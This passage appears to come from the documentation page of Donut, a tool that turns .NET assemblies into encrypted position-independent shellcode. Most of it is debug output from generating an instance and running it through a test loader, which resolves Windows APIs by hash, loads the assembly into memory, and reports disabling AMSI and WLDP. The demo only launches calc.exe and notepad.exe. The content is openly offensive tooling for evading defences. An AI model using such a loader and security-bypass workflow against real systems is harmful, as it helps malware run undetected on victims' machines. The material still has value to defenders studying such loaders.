DEBUG: donut.c:701:CreateInstance(): Hash for oleaut32.dll    : SafeArrayGetLBound     = E7F17458F8324A18
DEBUG: donut.c:701:CreateInstance(): Hash for oleaut32.dll    : SafeArrayGetUBound     = A0E697EAD910BA4
DEBUG: donut.c:701:CreateInstance(): Hash for oleaut32.dll    : SysAllocString         = 5245DCE7DC4D0487
DEBUG: donut.c:701:CreateInstance(): Hash for oleaut32.dll    : SysFreeString          = E1F3BE3034467EAB
DEBUG: donut.c:701:CreateInstance(): Hash for oleaut32.dll    : LoadTypeLib            = 233A01573D7C3C61
DEBUG: donut.c:701:CreateInstance(): Hash for wininet.dll     : InternetCrackUrlA      = 703BB1F37AAA7DE8
DEBUG: donut.c:701:CreateInstance(): Hash for wininet.dll     : InternetOpenA          = DB576B97A102B224
DEBUG: donut.c:701:CreateInstance(): Hash for wininet.dll     : InternetConnectA       = 2B5342F6FBAD9798
DEBUG: donut.c:701:CreateInstance(): Hash for wininet.dll     : InternetSetOptionA     = E06936DC65A9106E
DEBUG: donut.c:701:CreateInstance(): Hash for wininet.dll     : InternetReadFile       = EFED0D64262F4206
DEBUG: donut.c:701:CreateInstance(): Hash for wininet.dll     : InternetCloseHandle    = 570466BEBCE01375
DEBUG: donut.c:701:CreateInstance(): Hash for wininet.dll     : HttpOpenRequestA       = 2C4FF0220C5C7D9A
DEBUG: donut.c:701:CreateInstance(): Hash for wininet.dll     : HttpSendRequestA       = CF9D38D7AE64BAFE
DEBUG: donut.c:701:CreateInstance(): Hash for wininet.dll     : HttpQueryInfoA         = 8550BCC6C66B871E
DEBUG: donut.c:701:CreateInstance(): Hash for mscoree.dll     : CorBindToRuntime       = AD2EB4CF8F3A11E8
DEBUG: donut.c:701:CreateInstance(): Hash for mscoree.dll     : CLRCreateInstance      = 1FC297FF9724F003
DEBUG: donut.c:701:CreateInstance(): Hash for ole32.dll       : CoInitializeEx         = 58E56592C50101DA
DEBUG: donut.c:701:CreateInstance(): Hash for ole32.dll       : CoCreateInstance       = 2BA66279C8B60199
DEBUG: donut.c:701:CreateInstance(): Hash for ole32.dll       : CoUninitialize         = F7593A851FF9E51
DEBUG: donut.c:716:CreateInstance(): Copying GUID structures and DLL strings for loading .NET assemblies
DEBUG: donut.c:810:CreateInstance(): Copying module data to instance
DEBUG: donut.c:815:CreateInstance(): encrypting instance
DEBUG: donut.c:912:DonutCreate(): Saving instance to file
DEBUG: donut.c:943:DonutCreate(): PIC size : 32579
DEBUG: donut.c:946:DonutCreate(): Inserting opcodes
DEBUG: donut.c:974:DonutCreate(): Copying 14747 bytes of x86 + amd64 shellcode
  [ Instance type : PIC
  [ Module file   : "Class1.dll"
  [ File type     : .NET DLL
  [ Class         : TestClass
  [ Method        : RunProcess
  [ Parameters    : calc.exe,notepad.exe
  [ Target CPU    : x86+AMD64
  [ Shellcode     : "payload.bin"
</pre>

<p>Pass the instance as a parameter to payload.exe and it will run on the host system as if in a target environment.</p>

<pre>
C:\hub\donut\payload>payload ..\instance
Running...
DEBUG: payload.c:49:ThreadProc(): Decrypting 17800 bytes of instance
DEBUG: payload.c:56:ThreadProc(): Generating hash to verify decryption
DEBUG: payload.c:58:ThreadProc(): Instance : 4564b30f0224473e | Result : 4564b30f0224473e
DEBUG: payload.c:65:ThreadProc(): Resolving LoadLibraryA
DEBUG: payload.c:71:ThreadProc(): Loading ole32.dll ...
DEBUG: payload.c:71:ThreadProc(): Loading oleaut32.dll ...
DEBUG: payload.c:71:ThreadProc(): Loading wininet.dll ...
DEBUG: payload.c:71:ThreadProc(): Loading mscoree.dll ...
DEBUG: payload.c:75:ThreadProc(): Resolving 33 API
DEBUG: payload.c:78:ThreadProc(): Resolving API address for 4DD1D6F1D46F6992
DEBUG: payload.c:78:ThreadProc(): Resolving API address for 6E8B72FD465B8225
DEBUG: payload.c:78:ThreadProc(): Resolving API address for 1AD174A08D809070
DEBUG: payload.c:78:ThreadProc(): Resolving API address for 9DF4FC42AA7533FA
DEBUG: payload.c:78:ThreadProc(): Resolving API address for 1D71AE5F24A5E7A6
DEBUG: payload.c:78:ThreadProc(): Resolving API address for 7302D183648832CB
DEBUG: payload.c:78:ThreadProc(): Resolving API address for 65E6E9499AC90BD8
DEBUG: payload.c:78:ThreadProc(): Resolving API address for B2A4F7DD6EAEB6F4
DEBUG: payload.c:78:ThreadProc(): Resolving API address for 03E1876D08DFDC1F
DEBUG: payload.c:78:ThreadProc(): Resolving API address for DF30EF9017CD4DAF
DEBUG: payload.c:78:ThreadProc(): Resolving API address for 34E097D741D604AD
DEBUG: payload.c:78:ThreadProc(): Resolving API address for CDC685B2D3AEF24F
DEBUG: payload.c:78:ThreadProc(): Resolving API address for 12D4AE84222EEF0D
DEBUG: payload.c:78:ThreadProc(): Resolving API address for E7F17458F8324A18
DEBUG: payload.c:78:ThreadProc(): Resolving API address for 0A0E697EAD910BA4
DEBUG: payload.c:78:ThreadProc(): Resolving API address for 5245DCE7DC4D0487
DEBUG: payload.c:78:ThreadProc(): Resolving API address for E1F3BE3034467EAB
DEBUG: payload.c:78:ThreadProc(): Resolving API address for 233A01573D7C3C61
DEBUG: payload.c:78:ThreadProc(): Resolving API address for 703BB1F37AAA7DE8
DEBUG: payload.c:78:ThreadProc(): Resolving API address for DB576B97A102B224
DEBUG: payload.c:78:ThreadProc(): Resolving API address for 2B5342F6FBAD9798
DEBUG: payload.c:78:ThreadProc(): Resolving API address for E06936DC65A9106E
DEBUG: payload.c:78:ThreadProc(): Resolving API address for EFED0D64262F4206
DEBUG: payload.c:78:ThreadProc(): Resolving API address for 570466BEBCE01375
DEBUG: payload.c:78:ThreadProc(): Resolving API address for 2C4FF0220C5C7D9A
DEBUG: payload.c:78:ThreadProc(): Resolving API address for CF9D38D7AE64BAFE
DEBUG: payload.c:78:ThreadProc(): Resolving API address for 8550BCC6C66B871E
DEBUG: payload.c:78:ThreadProc(): Resolving API address for AD2EB4CF8F3A11E8
DEBUG: payload.c:78:ThreadProc(): Resolving API address for 1FC297FF9724F003
DEBUG: payload.c:78:ThreadProc(): Resolving API address for 58E56592C50101DA
DEBUG: peb.c:87:FindExport(): 58e56592c50101da is forwarded to api-ms-win-core-com-l1-1-0.CoInitializeEx
DEBUG: peb.c:110:FindExport(): Trying to load api-ms-win-core-com-l1-1-0.dll
DEBUG: peb.c:114:FindExport(): Calling GetProcAddress(CoInitializeEx)
DEBUG: payload.c:78:ThreadProc(): Resolving API address for 2BA66279C8B60199
DEBUG: peb.c:87:FindExport(): 2ba66279c8b60199 is forwarded to api-ms-win-core-com-l1-1-0.CoCreateInstance
DEBUG: peb.c:110:FindExport(): Trying to load api-ms-win-core-com-l1-1-0.dll
DEBUG: peb.c:114:FindExport(): Calling GetProcAddress(CoCreateInstance)
DEBUG: payload.c:78:ThreadProc(): Resolving API address for 0F7593A851FF9E51
DEBUG: peb.c:87:FindExport(): 0f7593a851ff9e51 is forwarded to api-ms-win-core-com-l1-1-0.CoUninitialize
DEBUG: peb.c:110:FindExport(): Trying to load api-ms-win-core-com-l1-1-0.dll
DEBUG: peb.c:114:FindExport(): Calling GetProcAddress(CoUninitialize)
DEBUG: payload.c:93:ThreadProc(): Using module embedded in instance
DEBUG: inmem_dotnet.c:43:LoadAssembly(): Using module embedded in instance
DEBUG: inmem_dotnet.c:51:LoadAssembly(): CLRCreateInstance
DEBUG: inmem_dotnet.c:59:LoadAssembly(): ICLRMetaHost::GetRuntime
DEBUG: inmem_dotnet.c:66:LoadAssembly(): ICLRRuntimeInfo::IsLoadable
DEBUG: inmem_dotnet.c:70:LoadAssembly(): ICLRRuntimeInfo::GetInterface
DEBUG: inmem_dotnet.c:78:LoadAssembly(): HRESULT: 00000000
DEBUG: inmem_dotnet.c:100:LoadAssembly(): ICorRuntimeHost::Start
DEBUG: inmem_dotnet.c:107:LoadAssembly(): ICorRuntimeHost::CreateDomain
DEBUG: inmem_dotnet.c:115:LoadAssembly(): IUnknown::QueryInterface
DEBUG: inmem_dotnet.c:123:LoadAssembly(): DisableAMSI OK
DEBUG: inmem_dotnet.c:127:LoadAssembly(): DisableWLDP OK
DEBUG: inmem_dotnet.c:134:LoadAssembly(): Copying assembly to safe array
DEBUG: inmem_dotnet.c:140:LoadAssembly(): AppDomain::Load_3
DEBUG: inmem_dotnet.c:147:LoadAssembly(): HRESULT : 00000000
DEBUG: inmem_dotnet.c:149:LoadAssembly(): Erasing assembly from memory
DEBUG: inmem_dotnet.c:155:LoadAssembly(): SafeArrayDestroy
DEBUG: inmem_dotnet.c:176:RunAssembly(): Using module embedded in instance
DEBUG: inmem_dotnet.c:184:RunAssembly(): Type is DLL
DEBUG: inmem_dotnet.c:255:RunAssembly(): SysAllocString("TestClass")
DEBUG: inmem_dotnet.c:259:RunAssembly(): SysAllocString("RunProcess")
DEBUG: inmem_dotnet.c:263:RunAssembly(): Assembly::GetType_2
DEBUG: inmem_dotnet.c:269:RunAssembly(): SafeArrayCreateVector(2 parameter(s))
DEBUG: inmem_dotnet.c:276:RunAssembly(): Adding "calc.exe" as parameter 1
DEBUG: inmem_dotnet.c:276:RunAssembly(): Adding "notepad.exe" as parameter 2
DEBUG: inmem_dotnet.c:292:RunAssembly(): Calling Type::InvokeMember_3
DEBUG: inmem_dotnet.c:306:RunAssembly(): Type::InvokeMember_3 : 00000000 : Success
DEBUG: inmem_dotnet.c:323:FreeAssembly(): Type::Release
DEBUG: inmem_dotnet.c:335:FreeAssembly(): Assembly::Release
DEBUG: inmem_dotnet.c:341:FreeAssembly(): AppDomain::Release
DEBUG: inmem_dotnet.c:347:FreeAssembly(): IUnknown::Release
DEBUG: inmem_dotnet.c:353:FreeAssembly(): ICorRuntimeHost::Stop
DEBUG: inmem_dotnet.c:356:FreeAssembly(): ICorRuntimeHost::Release
DEBUG: inmem_dotnet.c:362:FreeAssembly(): ICLRRuntimeInfo::Release
DEBUG: inmem_dotnet.c:368:FreeAssembly(): ICLRMetaHost::Release
</pre>

<p>Obviously you should be cautious with what files you decide to execute on your machine.</p>

</body>
</html>
